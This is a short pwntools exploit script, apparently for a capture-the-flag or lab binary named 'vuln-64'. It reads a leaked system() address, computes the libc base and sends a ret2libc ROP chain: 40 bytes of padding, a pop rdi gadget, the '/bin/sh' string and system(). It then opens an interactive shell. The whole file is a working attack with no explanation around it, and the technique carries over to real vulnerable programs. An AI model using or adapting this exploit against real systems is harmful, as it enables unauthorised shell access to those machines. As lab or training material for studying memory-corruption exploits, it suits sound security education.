from pwn import *

# Set arch context 
elf = context.binary = ELF('./vuln-64')
io = process()


# Assign elf to libc object
libc = elf.libc



# Grab leaked system address
io.recvuntil('at: ')
system_leak = int(io.recvline(), 16)



# Calculate libc address
libc.address = system_leak - libc.sym['system']

# Gadgets 
ret = p64(0x0000000000401016)
pop_rdi = p64(0x00000000004011db)

# Output libc address
log.success(f'LIBC base: {hex(libc.address)}')

# Send payload
payload = flat(
	b'A' * 40,
	pop_rdi,
	next(libc.search(b'/bin/sh')),
	ret,
	libc.sym['system'],
	)

io.sendline(payload)
io.interactive()